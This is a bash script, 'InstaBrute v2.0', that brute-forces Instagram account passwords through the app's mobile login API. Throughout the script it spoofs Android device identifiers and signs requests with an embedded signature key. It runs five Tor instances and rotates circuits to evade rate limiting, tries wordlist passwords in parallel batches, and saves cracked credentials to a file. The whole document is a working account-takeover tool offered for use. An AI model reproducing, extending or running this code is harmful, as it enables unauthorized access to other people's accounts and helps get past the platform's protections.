#!/bin/bash

# Instagram: @Nakul_thakur_42
# InstaBrute v2.0 - Advanced Instagram Brute Forcer

trap 'store;exit 1' 2

# ======================== CONFIG ========================
BATCH_SIZE=20
DELAY_BETWEEN_BATCHES=0
TOR_START_DELAY=5
BACKOFF_INITIAL=5
BACKOFF_MAX=40
DEBUG=0
# ========================================================

# ======================== DEVICE SPOOF ========================
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32 | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
# ========================================================

# ======================== TOR PORTS ========================
TOR_PORTS=(9051 9052 9053 9054 9055)
TOR_DIRS=("/var/lib/tor1" "/var/lib/tor2" "/var/lib/tor3" "/var/lib/tor4" "/var/lib/tor5")
# ========================================================

ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
useragent='Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)'
backoff=0

checkroot() {
    if [[ "$(id -u)" -ne 0 ]]; then
        printf "\e[1;77mPlease, run this program as root!\n\e[0m"
        exit 1
    fi
}

dependencies() {
    command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Aborting."; exit 1; }
    command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Aborting."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Aborting."; exit 1; }
    command -v awk > /dev/null 2>&1 || { echo >&2 "I require awk but it's not installed. Aborting."; exit 1; }
    command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }
    command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
    command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
    command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
    command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
    command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }
    if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
        echo "/dev/urandom not found!"
        exit 1
    fi
}

banner() {
    printf "\e[1;92m     _                                      \e[0m\n"
    printf "\e[1;92m _  | |                                     \e[0m\n"
    printf "\e[1;92m( \ | | ____    ___  _| |_  _____           \e[0m\n"
    printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ |          \e[0m\n"
    printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ |  _____   \e[0m\n"
    printf "\e[1;77m    |_||_| |_|(___/    \__)\_____| (_____)  \e[0m\n"
    printf "\n"
    printf "\e[1;77m\e[45m   Instagram Brute Forcer v 2.0 Author: Nakul_thakur_42   \e[0m\n"
    printf "\e[1;77m\e[45m   Multi-Tor | Multi-Threaded | Anti-Detection            \e[0m\n"
    printf "\n"
}

function start() {
    banner
    checkroot
    dependencies
    read -p $'\e[1;92mUsername : \e[0m' user
    checkaccount=$(curl -s "https://www.instagram.com/$user/" | grep -c -i -E "page may have been removed|Sorry, this page")
    if [[ "$checkaccount" -ge 1 ]]; then
        printf "\e[1;91mInvalid Username! Try again\e[0m\n"
        sleep 1
        start
    else
        default_wl_pass="pass.txt"
        read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
        wl_pass="${wl_pass:-${default_wl_pass}}"
        if [[ ! -f "$wl_pass" ]]; then
            printf "\e[1;91mWordlist file not found: %s\e[0m\n" "$wl_pass"
            exit 1
        fi
        default_threads="10"
        read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
        threads="${threads:-${default_threads}}"
    fi
    var=$(curl --socks5 127.0.0.1:9051 -i -s -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
    var2=$(echo "$var" | grep -i "set-cookie" | grep -o "csrftoken=[^;]*" | head -1 | cut -d '=' -f2)
    if [[ -z "$var2" ]]; then
        printf "\e[1;93m[!] CSRF token fetch failed, retrying without Tor...\e[0m\n"
        var=$(curl -i -s -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
        var2=$(echo "$var" | grep -i "set-cookie" | grep -o "csrftoken=[^;]*" | head -1 | cut -d '=' -f2)
    fi
    if [[ "$DEBUG" -eq 1 ]]; then
        printf "\e[1;93m[DEBUG] Raw CSRF response saved to debug_csrf.log\e[0m\n"
        echo "$var" > debug_csrf.log
    fi
    printf "\e[1;92m[*] CSRF Token: \e[0m\e[1;77m%s\e[0m\n" "$var2"
}

multitor() {
    printf "\e[1;92m[*] Starting 5 Tor instances...\e[0m\n"
    killall tor > /dev/null 2>&1
    sleep 1

    for i in "${!TOR_PORTS[@]}"; do
        port="${TOR_PORTS[$i]}"
        dir="${TOR_DIRS[$i]}"
        mkdir -p "$dir"
        tor --RunAsDaemon 1 --SocksPort "$port" --DataDirectory "$dir" --Log "notice file $dir/tor.log" > /dev/null 2>&1
        printf "\e[1;77m  [*] Tor instance %s started on port %s\e[0m\n" "$((i+1))" "$port"
    done

    printf "\e[1;92m[*] Waiting for Tor circuits to establish...\e[0m\n"
    sleep "$TOR_START_DELAY"
}

checkmultitor() {
    printf "\e[1;92m[*] Checking Tor connections...\e[0m\n"
    WORKING_PORTS=()
    failed_ports=()

    for i in "${!TOR_PORTS[@]}"; do
        port="${TOR_PORTS[$i]}"
        check=$(curl --socks5 "localhost:$port" -s --max-time 10 https://check.torproject.org/api/ip 2>/dev/null)
        if [[ -z "$check" ]]; then
            printf "\e[1;91m  [!] Tor on port %s: FAILED\e[0m\n" "$port"
            failed_ports+=("$port")
        else
            ip=$(echo "$check" | grep -o '"IP":"[^"]*"' | cut -d'"' -f4)
            printf "\e[1;92m  [+] Tor on port %s: OK (IP: %s)\e[0m\n" "$port" "$ip"
            WORKING_PORTS+=("$port")
        fi
    done

    # Retry failed ports up to 3 times
    max_retries=3
    retry=1
    while [[ ${#failed_ports[@]} -gt 0 && $retry -le $max_retries ]]; do
        printf "\e[1;93m[*] Retry %s/%s for %s failed instance(s) in 5s...\e[0m\n" "$retry" "$max_retries" "${#failed_ports[@]}"
        sleep 5
        still_failed=()
        for port in "${failed_ports[@]}"; do
            check=$(curl --socks5 "localhost:$port" -s --max-time 10 https://check.torproject.org/api/ip 2>/dev/null)
            if [[ -z "$check" ]]; then
                printf "\e[1;91m  [!] Tor on port %s: STILL FAILED (retry %s)\e[0m\n" "$port" "$retry"
                still_failed+=("$port")
            else
                ip=$(echo "$check" | grep -o '"IP":"[^"]*"' | cut -d'"' -f4)
                printf "\e[1;92m  [+] Tor on port %s: RECOVERED (IP: %s)\e[0m\n" "$port" "$ip"
                WORKING_PORTS+=("$port")
            fi
        done
        failed_ports=("${still_failed[@]}")
        retry=$((retry+1))
    done

    working_count=${#WORKING_PORTS[@]}
    printf "\n\e[1;92m[*] Working Tor instances: %s/5\e[0m\n" "$working_count"

    if [[ "$working_count" -lt 3 ]]; then
        printf "\e[1;91m[!] Need at least 3 Tor instances to run. Only %s working.\e[0m\n" "$working_count"
        printf "\e[1;91m[!] Check your Tor configuration and try again.\e[0m\n"
        exit 1
    fi

    if [[ "$working_count" -lt 5 ]]; then
        printf "\e[1;93m[!] Warning: Running with %s threads instead of 5\e[0m\n" "$working_count"
    fi
}

function store() {
    if [[ -n "$threads" ]]; then
        printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
        sleep 5
        default_session="Y"
        printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $user
        read -p $'\e[1;77m? [Y/n]: \e[0m' session
        session="${session:-${default_session}}"
        if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
            if [[ ! -d sessions ]]; then
                mkdir sessions
            fi
            printf "user=\"%s\"\nwl_pass=\"%s\"\nstartline=\"%s\"\n" "$user" "$wl_pass" "$startline" > "sessions/store.session.$user.$(date +"%FT%H%M")"
            printf "\e[1;77mSession saved.\e[0m\n"
            printf "\e[1;92mUse ./Brute.sh --resume\n"
        else
            exit 1
        fi
    else
        exit 1
    fi
}

function changeip() {
    printf "\e[1;92m[*] Rotating Tor circuits...\e[0m\n"
    killall -HUP tor
    sleep 3
}

function bruteforcer() {
    checkmultitor
    num_threads=${#WORKING_PORTS[@]}
    count_pass=$(wc -l $wl_pass | cut -d " " -f1)
    printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" "$user"
    printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s passwords)\e[0m\n" "$wl_pass" "$count_pass"
    printf "\e[1;92mThreads:\e[0m\e[1;77m %s x %s batch = %s concurrent\e[0m\n" "$num_threads" "$BATCH_SIZE" "$((num_threads * BATCH_SIZE))"
    printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"

    startline=1
    while [ true ]; do
        changeip

        for ((t=0; t<num_threads; t++)); do
            port="${WORKING_PORTS[$t]}"
            thread_label="T$((t+1))"
            thread_startline=$((startline + t * BATCH_SIZE))
            thread_endline=$((thread_startline + BATCH_SIZE - 1))
            counter=1
            IFS=$'\n'
            for pass in $(sed -n "${thread_startline},${thread_endline}p" "$wl_pass"); do
                data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
                countpass=$((thread_startline + counter - 1))
                hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
                printf "\e[1;77m[%s] Trying pass (%s/%s)\e[0m: %s\n" "$thread_label" "$countpass" "$count_pass" "$pass"
                {(trap '' SIGINT && response=$(curl --socks5 "127.0.0.1:$port" -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" -H "Connection: close" -H "Accept: */*" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-IG-App-ID: 567067343352127" -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/accounts/login/"); if [[ "$DEBUG" -eq 1 ]]; then echo "[$(date '+%H:%M:%S')] $pass -> $response" >> debug_login.log; fi; var=$(echo "$response" | grep -o "200\|challenge\|checkpoint_required\|many tries\|Please wait\|bad_password\|invalid_password\|login_required" | uniq); if [[ $var == "challenge" || $var == "checkpoint_required" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge/Checkpoint required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "Please wait" ]]; then printf "\e[1;91m  [!] Rate limited on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; backoff=$((backoff+1)); elif [[ -z "$var" ]]; then printf "\e[1;91m  [!] No match on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; if [[ "$DEBUG" -eq 1 ]]; then printf "\e[1;93m  [DEBUG] Raw: %s\e[0m\n" "$(echo "$response" | head -5)"; fi; fi;)} &
                counter=$((counter+1))
                sleep 1
            done
            wait
        done

        # Exponential backoff
        if [[ "$backoff" -gt 0 ]]; then
            delay=$((BACKOFF_INITIAL * backoff))
            if [[ "$delay" -gt "$BACKOFF_MAX" ]]; then
                delay=$BACKOFF_MAX
            fi
            printf "\e[1;91m[*] Rate limited %s times. Backing off %ss...\e[0m\n" "$backoff" "$delay"
            sleep "$delay"
        else
            backoff=0
        fi

        let startline+=$((num_threads * BATCH_SIZE))

        if [[ "$DELAY_BETWEEN_BATCHES" -gt 0 ]]; then
            sleep "$DELAY_BETWEEN_BATCHES"
        fi
    done
}

function resume() {
    banner
    multitor
    checkmultitor
    num_threads=${#WORKING_PORTS[@]}
    counter=1
    if [[ ! -d sessions ]]; then
        printf "\e[1;91m[*] No sessions\n\e[0m"
        exit 1
    fi
    printf "\e[1;92mSaved sessions:\n\e[0m"
    for list in $(ls sessions/store.session* 2>/dev/null); do
        IFS=$'\n'
        source "$list"
        printf "\e[1;92m%s \e[0m\e[1;77m: %s (user: %s, wl: %s, startline: %s)\n\e[0m" "$counter" "$list" "$user" "$wl_pass" "$startline"
        let counter++
    done
    read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
    source $(ls sessions/store.session* | sed "${fileresume}q;d")

    # Re-fetch CSRF token
    var=$(curl --socks5 127.0.0.1:9051 -i -s -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
    var2=$(echo "$var" | grep -i "set-cookie" | grep -o "csrftoken=[^;]*" | head -1 | cut -d '=' -f2)
    if [[ -z "$var2" ]]; then
        printf "\e[1;93m[!] CSRF token fetch failed, retrying without Tor...\e[0m\n"
        var=$(curl -i -s -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
        var2=$(echo "$var" | grep -i "set-cookie" | grep -o "csrftoken=[^;]*" | head -1 | cut -d '=' -f2)
    fi
    if [[ "$DEBUG" -eq 1 ]]; then
        printf "\e[1;93m[DEBUG] Raw CSRF response saved to debug_csrf.log\e[0m\n"
        echo "$var" > debug_csrf.log
    fi

    printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" "$user"
    printf "\e[1;92m[*] Wordlist:\e[0m \e[1;77m%s\e[0m\n" "$wl_pass"
    printf "\e[1;92m[*] Starting from line:\e[0m \e[1;77m%s\e[0m\n" "$startline"
    printf "\e[1;92m[*] Active threads:\e[0m \e[1;77m%s\e[0m\n" "$num_threads"
    printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
    count_pass=$(wc -l $wl_pass | cut -d " " -f1)

    while [ true ]; do
        changeip

        for ((t=0; t<num_threads; t++)); do
            port="${WORKING_PORTS[$t]}"
            thread_label="T$((t+1))"
            thread_startline=$((startline + t * BATCH_SIZE))
            thread_endline=$((thread_startline + BATCH_SIZE - 1))
            counter=1
            IFS=$'\n'
            for pass in $(sed -n "${thread_startline},${thread_endline}p" "$wl_pass"); do
                data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
                countpass=$((thread_startline + counter - 1))
                hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
                printf "\e[1;77m[%s] Trying pass (%s/%s)\e[0m: %s\n" "$thread_label" "$countpass" "$count_pass" "$pass"
                {(trap '' SIGINT && response=$(curl --socks5 "127.0.0.1:$port" -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --max-time 15 --user-agent "$useragent" -w "\n%{http_code}\n" -H "Connection: close" -H "Accept: */*" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "X-IG-App-ID: 567067343352127" -H "User-Agent: $useragent" "https://i.instagram.com/api/v1/accounts/login/"); if [[ "$DEBUG" -eq 1 ]]; then echo "[$(date '+%H:%M:%S')] $pass -> $response" >> debug_login.log; fi; var=$(echo "$response" | grep -o "200\|challenge\|checkpoint_required\|many tries\|Please wait\|bad_password\|invalid_password\|login_required" | uniq); if [[ $var == "challenge" || $var == "checkpoint_required" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge/Checkpoint required\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"; printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.passwords \n\e[0m"; kill -1 $$; elif [[ $var == "Please wait" ]]; then printf "\e[1;91m  [!] Rate limited on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; backoff=$((backoff+1)); elif [[ -z "$var" ]]; then printf "\e[1;91m  [!] No match on %s, saving: %s\e[0m\n" "$thread_label" "$pass"; printf "%s\n" "$pass" >> nottested.lst; if [[ "$DEBUG" -eq 1 ]]; then printf "\e[1;93m  [DEBUG] Raw: %s\e[0m\n" "$(echo "$response" | head -5)"; fi; fi;)} &
                counter=$((counter+1))
                sleep 1
            done
            wait
        done

        # Exponential backoff
        if [[ "$backoff" -gt 0 ]]; then
            delay=$((BACKOFF_INITIAL * backoff))
            if [[ "$delay" -gt "$BACKOFF_MAX" ]]; then
                delay=$BACKOFF_MAX
            fi
            printf "\e[1;91m[*] Rate limited %s times. Backing off %ss...\e[0m\n" "$backoff" "$delay"
            sleep "$delay"
        else
            backoff=0
        fi

        let startline+=$((num_threads * BATCH_SIZE))

        if [[ "$DELAY_BETWEEN_BATCHES" -gt 0 ]]; then
            sleep "$DELAY_BETWEEN_BATCHES"
        fi
    done
}

case "$1" in
    --resume)
        resume
        ;;
    --debug)
        DEBUG=1
        printf "\e[1;93m[*] Debug mode enabled - raw responses will be logged\e[0m\n"
        start
        multitor
        bruteforcer
        ;;
    --help)
        banner
        printf "\e[1;92mUsage:\e[0m\n"
        printf "  ./Brute.sh              Start new brute-force session\n"
        printf "  ./Brute.sh --resume     Resume a saved session\n"
        printf "  ./Brute.sh --debug      Start with debug logging\n"
        printf "  ./Brute.sh --help       Show this help message\n"
        printf "\n"
        printf "\e[1;92mFeatures:\e[0m\n"
        printf "  - 5 parallel Tor instances for IP rotation\n"
        printf "  - 5 concurrent threads (20 passwords each)\n"
        printf "  - Session save/resume support\n"
        printf "  - Exponential backoff on rate limits\n"
        printf "  - Untested password recovery (nottested.lst)\n"
        printf "\n"
        printf "\e[1;92mConfig (top of script):\e[0m\n"
        printf "  BATCH_SIZE         Passwords per thread (default: 20)\n"
        printf "  DELAY_BETWEEN_BATCHES  Delay between cycles (default: 0)\n"
        printf "  BACKOFF_INITIAL    Initial backoff delay (default: 5s)\n"
        printf "  BACKOFF_MAX        Maximum backoff delay (default: 40s)\n"
        ;;
    *)
        start
        multitor
        bruteforcer
        ;;
esac
